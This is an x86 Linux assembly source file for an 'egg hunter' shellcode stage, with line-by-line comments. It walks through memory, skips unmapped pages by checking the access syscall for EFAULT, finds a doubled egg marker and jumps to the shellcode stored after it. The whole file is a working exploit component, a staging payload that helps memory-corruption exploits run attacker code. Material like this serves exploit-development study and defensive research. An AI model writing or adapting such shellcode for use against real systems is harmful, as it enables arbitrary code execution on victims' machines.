; Egg Hunter
; Author: Aditya Chaudhary
; Date: 20th Jan 2019


global _start


section .text


_start:
  xor eax,eax             ; eax = 0
  mov edi, eax            ; edi = 0
  mov edi, dword 0x7b425448  ; EGG

next_page:
  or dx, 0xfff            ; dx=4095 ; 0x1000 - 1 (4095) ; Page sizes in Linux x86 = 4096

next_address:
  inc edx                 ; edx = 4096
  pusha                   ; push all of the current general purposes registers onto the stack
  lea ebx, [edx + 0x4]    ; address to be validated for memory violation
  mov al, 0x21            ; access systemcall
  int 0x80
  cmp al, 0xf2            ; compare return value, bad address = EFAULT (0xf2)
  popa                    ; get all the registers back
  jz next_page            ; jump to next page if EFAULT occurs
  cmp [edx], edi          ; compare 1st egg
  jnz next_address        ; jump to next address if NOT egg
  cmp [edx + 0x4], edi    ; compare 2nd egg
  jnz next_address        ; jump to next address if NOT egg
  jmp edx                 ; jump to the address where egg is located i.e. jump to our shellcode
